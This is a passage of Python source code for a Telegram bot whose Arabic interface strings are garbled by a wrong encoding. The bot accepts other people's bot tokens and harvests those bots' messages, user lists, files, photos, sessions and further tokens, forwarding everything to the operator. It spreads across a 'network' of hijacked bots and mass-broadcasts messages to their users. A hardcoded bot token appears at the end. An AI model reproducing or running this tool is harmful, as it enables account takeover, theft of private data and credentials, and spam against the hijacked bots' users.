                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {len(stats['all_users'])}\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {len(stats['all_files'])}\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„ØµÙˆØ± Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {len(stats['all_photos'])}\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {stats['total_tokens']} | {stats['valid_tokens']}âœ…\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {stats['total_sessions']}\n"
                        f"â€¢ Ù…Ø³ØªÙˆÙŠØ§Øª Ø§Ù„ØªÙØ±Ø¹: {analysis_result['total_levels']}\n\n"
                        f"ğŸ‘¤ Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø¥Ù„Ù‰ Ø­Ø³Ø§Ø¨Ùƒ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹"
                    )
                    
                    buttons = [
                        [Button.inline("ğŸ“¦ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª", "network_send_files"), Button.inline("ğŸ–¼ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±", "network_send_photos")],
                        [Button.inline("ğŸ” Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª", "network_send_sessions"), Button.inline("ğŸ”‘ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª", "network_send_tokens")],
                        [Button.inline("ğŸ“¢ Ø¥Ø°Ø§Ø¹Ø© Ø´Ø¨ÙƒÙŠØ©", "network_broadcast")]
                    ]
                    
                    await progress_msg.edit(stats_message, buttons=buttons)
                else:
                    await progress_msg.edit(f"âŒ ÙØ´Ù„ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ: {analysis_result['error']}")
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await progress_msg.edit(f"âŒ Ø­ØµÙ„ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ: {str(e)}")
        
        elif data.startswith('token_broadcast:'):
            token = data.split(':', 1)[1]
            await event.answer("ğŸ“¢ Ø¨Ø¯Ø¡ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ù…Ø­Ø¯Ø¯...")
            
            user_state['current_broadcast_token'] = token
            user_state['step'] = 'waiting_token_broadcast_message'
            await set_user_state(user_id, user_state)
            
            await event.edit("ğŸ“¢ Ø§Ø±Ø³Ù„ Ø§Ù„Ù†Øµ Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø¥Ø°Ø§Ø¹ØªÙ‡ Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª")
        
        elif data == 'network_broadcast':
            await event.answer("ğŸ“¢ Ø¨Ø¯Ø¡ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ©...")
            
            network_analysis_data = await get_network_analysis(user_id)
            if not network_analysis_data:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            user_state['step'] = 'waiting_network_broadcast_message'
            await set_user_state(user_id, user_state)
            
            await event.edit("ğŸ“¢ Ø§Ø±Ø³Ù„ Ø§Ù„Ù†Øµ Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø¥Ø°Ø§Ø¹ØªÙ‡ Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")
        
        elif data == 'network_send_files':
            await event.answer("ğŸ“¦ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©...")
            
            network_analysis_data = await get_network_analysis(user_id)
            if not network_analysis_data:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            all_bots = network_analysis_data['all_bots']
            
            success = await network_send_files(bot, all_bots, user_id)
            
            if success:
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…Ù„ÙØ§Øª Ø§Ù„Ø´Ø¨ÙƒØ©")
            else:
                await event.answer("âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ Ù…Ù„ÙØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")
        
        elif data == 'network_send_photos':
            await event.answer("ğŸ–¼ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©...")
            
            network_analysis_data = await get_network_analysis(user_id)
            if not network_analysis_data:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            all_bots = network_analysis_data['all_bots']
            
            success = await network_send_photos(bot, all_bots, user_id)
            
            if success:
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ± Ø§Ù„Ø´Ø¨ÙƒØ©")
            else:
                await event.answer("âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ ØµÙˆØ± ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")
        
        elif data == 'network_send_tokens':
            await event.answer("ğŸ”‘ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©...")
            
            network_analysis_data = await get_network_analysis(user_id)
            if not network_analysis_data:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            all_bots = network_analysis_data['all_bots']
            
            success = await network_send_tokens(bot, all_bots, user_id)
            
            if success:
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©")
            else:
                await event.answer("âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ ØªÙˆÙƒÙ†Ø§Øª ØµØ§Ù„Ø­Ø© ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")
        
        elif data == 'network_send_sessions':
            await event.answer("ğŸ” Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©...")
            
            network_analysis_data = await get_network_analysis(user_id)
            if not network_analysis_data:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            all_bots = network_analysis_data['all_bots']
            
            success = await network_send_sessions(bot, all_bots, user_id)
            
            if success:
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©")
            else:
                await event.answer("âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¬Ù„Ø³Ø§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")

    @bot.on(events.NewMessage(func=lambda e: e.is_private))
    async def message_handler(event):
        user_id = event.sender_id
        # Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ù† Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        user_state = await get_user_state(user_id)
        if not user_state:
            return

        text = event.text.strip()

        if text.startswith('/'):
            return

        if user_state['step'] == 'waiting_token':
            if ':' not in text:
                await event.respond("âŒ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠØŒ Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ù„ÙŠ Ø§Ù†Øª Ø¯Ø®Ù„ØªÙ‡ Ù…Ø´ ØµØ­! Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            user_state['token'] = text
            user_state['step'] = 'analyzing'
            await set_user_state(user_id, user_state)
            
            progress_msg = await event.respond("â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª ÙˆØ§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: 0%")
            
            last_percent = -1
            async def update_analysis_progress(current, total, percent):
                nonlocal last_percent
                if abs(percent - last_percent) >= 1 or current == total:
                    last_percent = percent
                    new_text = f"â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª ÙˆØ§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: {percent:.1f}% ({total})"
                    await safe_edit_message(progress_msg, new_text)
                return True
            
            analysis = await analyze_bot(user_state['token'], user_id, update_analysis_progress)
            
            if not analysis['success']:
                await progress_msg.edit(f"âŒ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠØŒ ÙÙŠ Ù…Ø´ÙƒÙ„Ø© ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø¨ÙˆØª\nØ§Ù„Ø®Ø·Ø£: {analysis['error']}")
                await set_user_state(user_id, {'step': 'start'})
                return
            
            user_state['analysis'] = analysis
            user_state['max_id'] = analysis['total_messages']
            user_state['step'] = 'analyzed'
            await set_user_state(user_id, user_state)
            
            stats_message = (
                f"âœ… ØªÙ… Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù†Ø¬Ø§Ø­!\n\n"
                f"ğŸ¤– Ø§Ù„Ø¨ÙˆØª: @{analysis['bot_username']}\n\n"
                f"ğŸ“Š Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª:\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {analysis['total_messages']}\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {analysis['total_users']}\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ù„ÙØ§Øª: {analysis['total_files']}\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„ØµÙˆØ±: {analysis['total_photos']}\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª: {analysis['tokens']['total']} | {analysis['tokens']['valid']}âœ…\n"
                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø¬Ù„Ø³Ø§Øª: {analysis['sessions']['total']}\n\n"
                f"ğŸ‘¤ Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø¥Ù„Ù‰ Ø­Ø³Ø§Ø¨Ùƒ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹"
            )
            
            buttons = [
                [Button.inline("ğŸ“¤ Ø³Ø­Ø¨ ÙƒÙ„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„", "all_messages")],
                [Button.inline("ğŸ“¦ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª", "send_files"), Button.inline("ğŸ–¼ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±", "send_photos")],
                [Button.inline("ğŸ” Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª", "send_sessions"), Button.inline("ğŸ‘¥ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†", "send_users")],
                [Button.inline("ğŸ”‘ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª", "send_tokens"), Button.inline("ğŸ” ÙØ­Øµ Ù…ÙØµÙ„ ÙƒØ§Ù…Ù„", "deep_analysis")]
            ]
            
            await progress_msg.edit(stats_message, buttons=buttons)
            
        elif user_state['step'] == 'waiting_broadcast_message':
            broadcast_text = text
            users = user_state['users_list']
            total_users = len(users)
            
            stop_events[user_id] = asyncio.Event()
            stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
            
            progress_msg = await event.respond(f"ğŸš€ Ø¨Ø¯Ø¡ Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù†Øµ Ø¥Ù„Ù‰ {total_users} Ù…Ø³ØªØ®Ø¯Ù…...", buttons=stop_button)
            broadcast_messages[user_id] = progress_msg
            
            last_update_time = 0
            last_percent = -1
            async def update_broadcast_progress(current, total):
                nonlocal last_update_time, last_percent
                if user_id in stop_events and stop_events[user_id].is_set():
                    return False
                    
                current_time = time.time()
                current_percent = (current / total) * 100 if total > 0 else 0
                
                if (current_time - last_update_time >= 5 or 
                    abs(current_percent - last_percent) >= 1 or 
                    current == total):
                    
                    last_update_time = current_time
                    last_percent = current_percent
                    new_text = f"ğŸ“¤ Ø¬Ø§Ø±ÙŠ Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ù†Øµ: {current}/{total} ({current_percent:.1f}%)"
                    await safe_edit_message(progress_msg, new_text, stop_button)
                return True
            
            try:
                success, failed = await broadcast_message(
                    user_state['token'],
                    users,
                    broadcast_text,
                    update_broadcast_progress,
                    stop_events.get(user_id)
                )
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                await progress_msg.edit(f"ğŸ‰ Ø®Ù„ØµÙ†Ø§ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠ Ùˆ Ø¹Ù…Ù„Øª Ø§Ø°Ø§Ø¹Ù‡!\nâœ… Ù†Ø¬Ø­Ù†Ø§ ÙÙŠ Ø§Ø±Ø³Ø§Ù„ {success} Ø±Ø³Ø§Ù„Ø©\nâŒ ÙØ´Ù„Ù†Ø§ ÙÙŠ Ø§Ø±Ø³Ø§Ù„ {failed} Ø±Ø³Ø§Ù„Ø©")
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await progress_msg.edit(f"âŒ Ø­ØµÙ„ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø©: {str(e)}")
        
        elif user_state['step'] == 'waiting_token_broadcast_message':
            broadcast_text = text
            token = user_state['current_broadcast_token']
            
            try:
                users = await extract_users_from_bot(token, user_id)
                total_users = len(users)
                
                stop_events[user_id] = asyncio.Event()
                stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
                
                progress_msg = await event.respond(f"ğŸš€ Ø¨Ø¯Ø¡ Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ù…Ù† Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø«Ø§Ù†ÙˆÙŠ Ø¥Ù„Ù‰ {total_users} Ù…Ø³ØªØ®Ø¯Ù…...", buttons=stop_button)
                
                last_update_time = 0
                last_percent = -1
                async def update_token_broadcast_progress(current, total):
                    nonlocal last_update_time, last_percent
                    if user_id in stop_events and stop_events[user_id].is_set():
                        return False
                        
                    current_time = time.time()
                    current_percent = (current / total) * 100 if total > 0 else 0
                    
                    if (current_time - last_update_time >= 5 or 
                        abs(current_percent - last_percent) >= 1 or 
                        current == total):
                        
                        last_update_time = current_time
                        last_percent = current_percent
                        new_text = f"ğŸ“¤ Ø¬Ø§Ø±ÙŠ Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ù†Øµ: {current}/{total} ({current_percent:.1f}%)"
                        await safe_edit_message(progress_msg, new_text, stop_button)
                    return True
                
                success, failed = await broadcast_message(
                    token,
                    users,
                    broadcast_text,
                    update_token_broadcast_progress,
                    stop_events.get(user_id)
                )
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                await progress_msg.edit(f"ğŸ‰ Ø®Ù„ØµÙ†Ø§ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠ!\nâœ… Ù†Ø¬Ø­Ù†Ø§ ÙÙŠ Ø§Ø±Ø³Ø§Ù„ {success} Ø±Ø³Ø§Ù„Ø©\nâŒ ÙØ´Ù„Ù†Ø§ ÙÙŠ Ø§Ø±Ø³Ø§Ù„ {failed} Ø±Ø³Ø§Ù„Ø©")
                
                del user_state['current_broadcast_token']
                user_state['step'] = 'analyzed'
                await set_user_state(user_id, user_state)
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await event.respond(f"âŒ Ø­ØµÙ„ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø©: {str(e)}")
        
        elif user_state['step'] == 'waiting_network_broadcast_message':
            broadcast_text = text
            
            network_analysis_data = await get_network_analysis(user_id)
            if not network_analysis_data:
                await event.respond("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            all_bots = network_analysis_data['all_bots']
            
            stop_events[user_id] = asyncio.Event()
            stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
            
            progress_msg = await event.respond(f"ğŸš€ Ø¨Ø¯Ø¡ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ© Ø¥Ù„Ù‰ {len(all_bots)} Ø¨ÙˆØª...", buttons=stop_button)
            
            last_update_time = 0
            last_percent = -1
            last_success = -1
            last_failed = -1
            async def update_network_broadcast_progress(current, total, success_count, failed_count):
                nonlocal last_update_time, last_percent, last_success, last_failed
                if user_id in stop_events and stop_events[user_id].is_set():
                    return False
                    
                current_time = time.time()
                current_percent = (current / total) * 100 if total > 0 else 0
                
                if (current_time - last_update_time >= 5 or 
                    abs(current_percent - last_percent) >= 1 or 
                    success_count != last_success or 
                    failed_count != last_failed or
                    current == total):
                    
                    last_update_time = current_time
                    last_percent = current_percent
                    last_success = success_count
                    last_failed = failed_count
                    
                    new_text = (
                        f"ğŸ“¤ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ©: {current}/{total} ({current_percent:.1f}%)\n"
                        f"âœ… Ù†Ø¬Ø­: {success_count} | âŒ ÙØ´Ù„: {failed_count}"
                    )
                    await safe_edit_message(progress_msg, new_text, stop_button)
                return True
            
            try:
                total_success, total_failed = await network_broadcast(
                    all_bots,
                    broadcast_text,
                    update_network_broadcast_progress,
                    stop_events.get(user_id)
                )
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                await progress_msg.edit(
                    f"ğŸ‰ Ø®Ù„ØµÙ†Ø§ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠ Ù…Ù† Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ©!\n"
                    f"âœ… Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ù†Ø¬Ø§Ø­: {total_success} Ø±Ø³Ø§Ù„Ø©\n"
                    f"âŒ Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„ÙØ´Ù„: {total_failed} Ø±Ø³Ø§Ù„Ø©\n"
                    f"ğŸ“Š Ø¹Ø¨Ø± {len(all_bots)} Ø¨ÙˆØª"
                )
                
                user_state['step'] = 'analyzed'
                await set_user_state(user_id, user_state)
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await progress_msg.edit(f"âŒ Ø­ØµÙ„ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ©: {str(e)}")
    
    print("Starting bot...")
    await bot.start(bot_token='8242278557:AAHhKIbCQNtt5V3kPxLc7UgCzsCIa40GGXo')
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
